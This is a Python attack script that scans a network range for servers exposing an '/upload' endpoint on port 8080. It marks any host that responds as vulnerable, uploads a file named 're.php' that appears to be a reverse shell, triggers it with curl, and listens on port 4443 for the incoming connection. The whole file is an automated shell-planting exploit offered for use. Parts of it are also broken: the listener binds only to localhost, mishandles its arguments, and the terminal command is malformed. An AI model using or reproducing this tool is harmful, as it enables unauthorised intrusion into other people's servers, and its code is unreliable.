import os
import sys
import time
import requests
import json
import urllib3
import urllib
import hashlib
import socket

def listen(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 4443))
    s.listen(4443)
    while True:
        conn, addr = s.accept()
        print("[+] Connection from: %s" % str(addr))
        data = conn.recv(1024)
        print("[+] Received: %s" % data)
        conn.send(data)
        conn.close()

def download_file(url, filename):
    # NOTE the stream=True parameter
    r = requests.get(url, stream=True)
    with open(filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                #f.flush()
    return filename

def get_file_size(filename):
    return os.stat(filename).st_size

def get_file_md5(filename):
    import hashlib
    hash_md5 = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


def upload_file(url, filename):
    files = {'file': open(filename, 'rb')}
    r = requests.post(url, files=files)
    return r.text

def get_file_list(url):
    r = requests.get(url)
    return r.text


def scan_network(ip_range):
    ip_list = []
    for i in range(1, 255):
        ip = ip_range + str(i)
        try:
            socket.inet_aton(ip)
            ip_list.append(ip)
        except socket.error:
            pass
    return ip_list

def main():
    urllib3.disable_warnings()
    if len(sys.argv) < 2:
        print("Usage: python3 %s <target_ip_range>" % sys.argv[0])
        exit(1)
    target_ip_range = sys.argv[1]
    
    ip_list = scan_network(target_ip_range)
    fast = 0.5
    slow = 3
    speed = input("[*] The slow scan can take 13 minutes and the fast one can take 3 minutes\n[+] Speed (fast/slow): ")
    if speed == "fast":
        timeo = fast
    elif speed == "slow":
        timeo = slow
    else:
        print("[-] Invalid speed")
        main()
    for ip in ip_list:
        try:
            url = "http://" + ip + ":8080/upload"

                
            print("[*] Testing %s" % url)
            r = requests.get(url, timeout=timeo)
            if r.status_code == 200:
                print("[+] %s is vulnerable" % url)
                filename = "re.php"
                print("[+] File size: %s" % get_file_size(filename))
                print("[+] File md5: %s" % get_file_md5(filename))
                upload_file(url, filename)
                print("[+] File %s uploaded" % filename)
                port = 4443
                print("[+] Listening on port %s" % port)
                os.system("gnome-terminal 'curl "+ url+"/re.php'")
                listen(port)
                
        except Exception as e:
            pass

if __name__ == "__main__":
    main()
